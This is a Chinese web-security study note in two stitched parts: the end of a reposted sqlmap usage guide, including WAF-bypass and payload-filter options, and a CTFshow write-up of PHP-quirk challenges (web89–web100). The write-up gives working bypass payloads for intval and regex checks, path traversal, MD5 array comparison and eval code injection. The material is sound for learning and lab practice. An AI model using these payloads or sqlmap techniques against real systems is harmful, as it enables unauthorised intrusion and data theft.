非ascii数据的检索需要特殊的需求。解决这个问题的一个方法是使用DBMS hex函数。数据在被检索之前被编码为十六进制形式，然后被未编码为原始形式。

–hex

例如： python sqlmap.py -u “http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1” –hex -v 3 –batch

### 14.5 设置自定义输出路径

sqlmap默认将会话和结果文件存储在子目录输出中。如果您想使用不同的位置，可以使用这个选项(例如–output-dir=/tmp)。

### 14.6 从响应页面解析错误

如果web应用程序配置为调试模式，以便在HTTP响应中显示后端数据库管理系统错误消息，sqlmap可以解析并显示它们。这对于调试很有用，比如理解为什么某个枚举或接管开关不起作用——这可能与会话用户的特权有关 –parse-error

保存Sqlmap配置文件 –save 可以将命令行选项保存到配置INI文件中。然后，可以使用之前解释的-c选项编辑生成的文件并将其传递给sqlmap。

更新Sqlmap –update

### 14.7 强制设置 DBMS 编码

–encoding=”gbk” 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025767.png)

### 14.8 存储 HTTP 流量到 HAR

–har=”HARFILE” HAR（HTTP Archive），是一个用来储存HTTP请求/响应信息的通用文件格式，基于JSON。 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020937.png)

### 14.9 筛选具体 Payload

–test-filter=”ROW” 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025817.png)

### 14.10 过滤具体 Payload

–test-skip=”BENCHMARK” 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020843.png)

 **补充：** 针对proxy日志文件使用正则表达式筛选目标 –scope=”regex”

## 0x0F sqlmap 杂项参数

### 15.1 使用缩写助记符

Sqlmap提供灵活的缩写助记符来进行快速书写命令。 -z 参数

例如： python sqlmap.py –batch –random-agent –ignore-proxy –technique=BEU -uwww.target.com/vuln.php?id=1″

使用助记符： python sqlmap.py -z “bat,randoma,ign,tec=BEU” -u “www.target.com/vuln.php?id=1”

### 15.2 设置探测预警

在发现SQL注入漏洞时，运行本机主机系统命令 –alert 

![img](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020505.png)

### 15.3 设置问题答案

如果用户想自动设置问题的答案，即使使用–batch，使用–answers，通过在等号后面提供问题的任何部分和答案来完成。另外，不同问题的答案可以用分隔符分隔。

例如： python sqlmap.py -u “http://192.168.22.128/sqlmap/mysql/get_int.php?id=1”–technique=E –answers=“extending=N” –batch

### 15.4 发现 SQL 注入预警

如果用户使用–beep，当发现SQL注入时，会立即发出哔哔的警告。这在需要测试的大量目标url(选项-m)时特别有用。

### 15.5 其他

–cleanup 清除DBMS udf创建的数据表 –dependencies 查看依赖项 –disable-coloring 不进行高亮显示 –identify-waf 查看是否具有WAF保护 –moblie 使用手机端User-Agent –purge-output 清除output目录下的文件 –skip-waf 绕过WAF –sqlmap-shell 使用sqlmap shell –tmp-dir=TMPDIR 指定本地目录用来存储临时文件 –web-root=WEBROOT 指定站点根目录 –wizard 使用向导式的sqlmap –gpage=GOOGLEPAGE 设置Google Dork的页码数

–smart 智能探测 有些情况下，用户有大量的潜在目标URL（例如，提供了选项 -m），希望尽快找到一个脆弱的目标。如果使用—smart，那么将在扫描中进一步使用数据库管理系统错误的参数，否则就跳过它们

## 0x10 常用 Tamper 脚本

这里推荐几篇比较详细的文章去学习： [https://www.cnblogs.com/mark0/p/12349551.html](https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fwww.cnblogs.com%2Fmark0%2Fp%2F12349551.html&objectId=2148285&objectType=1&contentType=undefined)

[https://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334…%2522%257D&request_id=159341834119725219951313&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3&utm_term=sqlmap+tamper脚本](https://cloud.tencent.com/developer/tools/blog-entry?target=https%3A%2F%2Fblog.csdn.net%2Fqq_34444097%2Farticle%2Fdetails%2F82717357%3Fops_request_misc%3D%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D%26request_id%3D159341834119725219951313%26biz_id%3D0%26utm_medium%3Ddistribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3%26utm_term%3Dsqlmap%20tamper%E8%84%9A%E6%9C%AC&objectId=2148285&objectType=1&contentType=undefined)





>  版权声明：本文内容由互联网用户自发贡献，该文观点仅代表作者本人。本站仅提供信息存储空间服务，不拥有所有权，不承担相关法律责任。如发现本站有涉嫌侵权/违法违规的内容， 请发送邮件至 举报，一经查实，本站将立刻删除。 
>
> 发布者：全栈程序员栈长，转载请注明出处：https://javaforall.cn/200744.html原文链接：https://javaforall.cn



















# 4、PHP特性
#### web89
```php
 <?php

include("flag.php");
highlight_file(__FILE__);

if (isset($_GET['num'])) {		//传入num
    $num = $_GET['num'];		//将num的值赋给$num
    if (preg_match("/[0-9]/", $num)) {		//检查 $num 是否包含数字字符
        die("no no no!");		//若匹配到数字，脚本终止并输出 no no no!
    }
    if (intval($num)) {			
        echo $flag;		//将 $num 转换为整数，若结果非零则输出 $flag
    }
}
```





根据intval()的特性：intval($num)为真，获取flag

可以输入数组：

```plain
?num[]=1
```

获得了flag

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030559.png)





补充知识：

`intval()`函数用于将变量转换为整数。其行为根据输入类型的不同而变化，

**1. 基本语法**

```php
intval(mixed $value, int $base = 10): int
```

`$value`：要转换的变量（支持所有数据类型）

`$base`：转化所使用的进制（默认10，仅对字符串有效）

**2. 不同数据类型的转换规则**

**2.1 字符串**

尝试提取开头的数字部分，忽略后续非数字字符。

```plain
intval("123");      // 123
intval("45.67");    // 45（浮点截断）
intval("123abc");   // 123（忽略字母）
intval("abc123");   // 0（开头无数字）
```

**2.2 浮点数**

直接截断小数部分。

```plain
intval(3.14);       // 3
intval(-2.718);     // -2
```

**2.3 布尔**

```plain
intval(true);       // 1
intval(false);      // 0
```

**2.4 数组**

空数组（`[]`） –> 0

非空数组（至少一个元素） –> 1

```plain
intval([]);         // 0
intval(["a"]);      // 1
intval([0, 1]);     // 1（与元素内容无关）
```

**2.5 对象**

不能用于 object，否则会产生 E_NOTICE 错误并返回 1

**2.6 NULL**

始终返回 0

```plain
intval(null);       // 0
```









#### web90
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if (isset($_GET['num'])) {		//检查是否存在num的GET参数
    $num = $_GET['num'];		//将GET参数num的值赋给变量$num
    if ($num === "4476") {		//比较$num是否等于字符串"4476"，若成立则终止脚本
        die("no no no!");
    }
    if (intval($num, 0) === 4476) {
        echo $flag;		//将$num转换为整数（自动检测进制），若结果为4476，则输出$flag
    } else {
        echo intval($num, 0);
    }
} 
```



当num为4476时输出no no no！

当num的整数部分为4476时得到flag



$num 为 "4476a"（不全等于 "4476"），绕过 die()

intval("4476a", 0) → 4476，触发 echo $flag



```plain
payload:（都可以绕过）
?num=4476a      # 附加字母
?num=4476%20    # 附加空格（URL编码）
?num=4476.0     # 浮点表示
?num=4476e0     # 科学计数法
?num=0x117c     # 十六进制
?num=010574 	# 八进制
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030738.png)

#### web91
```php
 <?php

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
} nonononono
```





我们需要构造一个输入使得它满足两个正则表达式条件：第一个正则（带多行模式）匹配成功，而第二个正则（不带多行模式）匹配失败。



 `/i `表示匹配的时候不区分大小写

 `/m `表示多行匹配 

`^$`符号表示匹配每一行的开头结尾

1. **多行模式匹配：** 第一个正则`/^php$/im`中的`m`修饰符允许`^`和`$`匹配每行的开头和结尾。只要有一行是`php`，则匹配成功。
2. **单行模式不匹配：** 第二个正则`/^php$/i`要求整个字符串必须完全匹配`php`，且没有多行模式，因此必须整个字符串都是`php`。

**构造Payload：**

在输入中添加换行符`%0a`，使得其中一行是`php`，但整个字符串不以`php`结尾。例如：`php%0a`。这样，第一行是`php`，满足第一个正则；整个字符串是`php\n`，不符合第二个正则的完整匹配。

```plain
?cmd=php%0a
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030117.png)

这里发现这个payload并不能使用



错误原因：（这里询问了ai）

+ 输入内容为 `php\n`（`php` 后跟换行符）。
+ **第一个正则匹配成功**：第一行是 `php`，符合多行模式。
+ **第二个正则也匹配成功**：PHP 的 `preg_match` 在单行模式下，`$` 会忽略末尾的换行符！因此实际匹配的是 `php`，导致输出 `hacker`。
+ 这是 PHP 正则表达式的一个特性：默认情况下，`$` 匹配字符串结尾或结尾的换行符前的位置（即使没有 `m` 修饰符）。







```plain
?cmd=%0aphp
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031488.png)



换位置后发现可以返回flag

+ 输入内容为 `\nphp`（换行符后跟 `php`）。
+ **第一个正则匹配成功**：第二行是 `php`，符合多行模式。
+ **第二个正则匹配失败**：整个字符串是 `\nphp`，不以 `php` 开头，因此无法匹配。







---

补充知识：

**正则运算符**

正则运算符是用于处理**文本匹配**的工具，主要用于在字符串中查找、替换或提取符合特定规则的文本。你可以把它理解为一个“文本过滤器”，帮助你快速找到想要的文字内容。

---

**正则运算符的基本符号：**

1. `.`：匹配任意单个字符（除了换行符）。例如：`a.b` 可以匹配 `aab`、`acb`、`a1b` 等。
2. `\*`：匹配前面的字符 0 次或多次。例如：`ab*` 可以匹配 `a`、`ab`、`abb`、`abbb` 等。
3. `+`：匹配前面的字符 1 次或多次。例如：`ab+` 可以匹配 `ab`、`abb`、`abbb`，但不能匹配 `a`。
4. `?`：匹配前面的字符 0 次或 1 次。例如：`ab?` 可以匹配 `a` 或 `ab`。
5. `\d`：匹配数字（0-9）。例如：`\d+` 可以匹配 `123`、`4567` 等。
6. `\w`：匹配字母、数字或下划线。例如：`\w+` 可以匹配 `abc`、`123`、`a_1` 等。
7. `[]`：匹配括号内的任意一个字符。例如：`[abc]` 可以匹配 `a`、`b` 或 `c`。
8. `^`：匹配字符串的开头。例如：`^abc` 可以匹配以 `abc` 开头的字符串。
9. `$`：匹配字符串的结尾。例如：`abc$` 可以匹配以 `abc` 结尾的字符串。
10. `^ &`：匹配字符串例如：`^abc&`匹配以abc开头和以abc结尾的字符串，实际上是只有abc与之匹配
11. `"notice"`: 匹配包含notice的字符串；
12. 

简单示例：

假设你有一段文字：

```plain
我的电话是 123-4567-8901，邮箱是 abc@example.com。
```

+ 用正则表达式 `\d{3}-\d{4}-\d{4}` 可以提取出电话号码 `123-4567-8901`。
+ 用正则表达式 `\w+@\w+\.\w+` 可以提取出邮箱 `abc@example.com`。





**正则运算符的修饰符：**

1. `i` - 不区分大小写匹配时忽略字母的大小写。
2. `m` - 多行模式使 `^` 和 `$` 匹配每一行的开始和结束，而不是整个字符串的开始和结束。

















#### web92
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }

```

这一关和90一样

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031282.png)













#### web93
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031346.png)











#### web94
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```



首先不能完全等于4476，也不能包含任何字母，strpos函数检查num中是否包含字符&quot;0&quot;（必须包含“0”），最后使用intval函数将num转换为整数

`strpos() `函数，用于在字符串中查找一个子串的第一次出现位置。如果找到了子串，则返回子串在字符串中的位置（索引），否则返回 false。

因此我们可以输入4476.0来绕过



payload:

```plain
?num=4476.0
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031248.png)









#### web95
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```





```php
 if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
```

使用正则表达式检查 $num 是否包含字母或小数点





```plain
if(!strpos($num, "0")){
        die("no no no!!!");
    }
```

检查 $num 中是否包含字符 "0"



因为有`strpos` 函数，八进制`010574`无法让绕过

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031834.png)

而十六进制`0x117c` 包含字母 `x`，因此 `preg_match` 会匹配成功，无法绕过



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031745.png)











所以我们在前面加个`+`

```plain
?num=+010574
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031384.png)











同样，加空格也可以绕过（空格是`%20`）

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031176.png)

















#### web96
```php
 <?php

highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
} 
```





如果 `u` 的值是 `'flag.php'`，会输出 `"no no no" `并停止执行；

如果 `u` 的值不是 `'flag.php'`，会尝试显示 `u` 参数指定的文件内容，并以语法高亮的形式展示。



要想看到flag.php文件，可以使用文件目录操作

```plain
?u=./flag.php
```

/   根目录

./  当前目录

../  上一个目录

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031668.png)







#### web97
```php
<?php

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?> 
```



1. `if (isset($_POST['a']) and isset($_POST['b'])) {`:检查用户是否通过 POST 请求提交了两个参数 `a` 和 `b`。如果 `a` 和 `b` 都存在，则继续执行下面的代码。
2. `if ($_POST['a'] != $_POST['b'])`:检查用户提交的 `a` 和 `b` 的值是否不相等。如果 `a` 和 `b` 的值不相等，则继续执行下面的代码。
3. `if (md5($_POST['a']) === md5($_POST['b']))`:计算 `a` 和 `b` 的 MD5 哈希值，并进行严格比较（`===`）。如果 `a` 和 `b` 的 MD5 哈希值相等，则执行 `echo $flag;`，输出 `flag.php` 否则，执行 `print 'Wrong.';`，输出 "Wrong."。

### 
解题思路：

需要利用MD5处理数组时的特性。当传入数组时，`md5()`函数会返回`null`，并且当两个数组不同但MD5都为`null`时，严格比较（`===`）成立。

所以我们构造数组：

1. 通过POST提交`a`和`b`作为数组，使其值不同但MD5结果均为`null`。
2. 确保`a`不等于`b`，但它们的MD5哈希严格相等，从而输出flag。



```plain
a[]=123&b[]=456
```



这里是post传参

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031853.png)













#### web98
```php
<?php

include("flag.php");
$_GET ? $_GET = &$_POST : 'flag';
$_GET['flag'] == 'flag' ? $_GET = &$_COOKIE : 'flag';
$_GET['flag'] == 'flag' ? $_GET = &$_SERVER : 'flag';
highlight_file($_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__); 
```



这个代码有些变扭，用ai转化一下



```php
<?php
include("flag.php");

// 第一次条件：如果存在 GET 参数，将 $_GET 指向 $_POST
if (!empty($_GET)) {
    $_GET = &$_POST;
}

// 第二次条件：检查 $_GET（此时可能指向 $_POST）中的 'flag' 参数
if (isset($_GET['flag']) && $_GET['flag'] === 'flag') {
    $_GET = &$_COOKIE;
}

// 第三次条件：检查 $_GET（此时可能指向 $_COOKIE）中的 'flag' 参数
if (isset($_GET['flag']) && $_GET['flag'] === 'flag') {
    $_GET = &$_SERVER;
}

// 最终决定显示 flag 还是当前文件
$fileToHighlight = (isset($_GET['HTTP_FLAG']) && $_GET['HTTP_FLAG'] === 'flag') ? $flag : __FILE__;
highlight_file($fileToHighlight);
```





```plain
$_GET['flag'] == 'flag' ? $_GET = &$_COOKIE : 'flag';
$_GET['flag'] == 'flag' ? $_GET = &$_SERVER : 'flag';
```

这两行代码对最后flag的输出没有影响因为最后源代码的显示主要看get参数HTTP_FLAG=flag是否成立

```plain
highlight_file($_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__);
```

但是我们不能直接get传参HTTP_FLAG=flag，因为如果get传参存在的话就会被post覆盖，所以我们可以get传参任意一个数（随便传但是必须有），然后再post传参HTTP_FLAG=flag覆盖get所传参数的值，便可以显示flag。



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031522.png)







#### web100
```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1 = $_GET['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if ($v0) {
    if (!preg_match("/\;/", $v2)) {
        if (preg_match("/\;/", $v3)) {
            eval("$v2('ctfshow')$v3");
        }
    }
} 
```



```php
if ($v0) {
    if (!preg_match("/\;/", $v2)) {
        if (preg_match("/\;/", $v3)) {
            eval("$v2('ctfshow')$v3");
        }
    }
}
```



以上代码表示只有$v0=1，且v2中不能含有分号，v3要有分号

```php
$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
```

在这段代码中只需要v1有数字即可，因为赋值操作的优先级大于and

```php
eval("$v2('ctfshow')$v3");
```

这段代码会执行括号里的内容，因此我们可以利用括号中的`	$v2('ctfshow')$v3`来构造可以输出flag的函数

```php
//flag in class ctfshow;
```

由题目中的注释可知flag在ctfshow中，因此我们只需要输出ctfshow即可

get传参传入

```plain
?v1=1&v2=var_dump($ctfshow)/*&v3=*/;
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022032011.png)





































# 参考资料

本篇文章参考：OWASP（开放式Web应用程序安全项目）

> https://owasp.org/Top10/

> OWASP（开放式Web应用程序安全项目）是一个开放的社区，由非营利组织 OWASP基金会支持的项目。对所有致力于改进应用程序安全的人士开放，旨在提高对应用程序安全性的认识。
> 其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结并更新Web应用程序中最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。
> 最重要的版本
> 应用程序中最严重的十大风险
> ————————————————
>
> **资料：**
>
> 通过网盘分享的文件：OWASP代码审计指南v2.0_中文版_刘传兴&孙维康.pdf
> 链接: https://pan.baidu.com/s/19E7tec4WmZ_IVVkanf3uxQ 提取码: e86b 
> --来自百度网盘超级会员v4的分享



[十大常见web漏洞及防范 - yzloo - 博客园](https://www.cnblogs.com/yzloo/p/10391078.html)



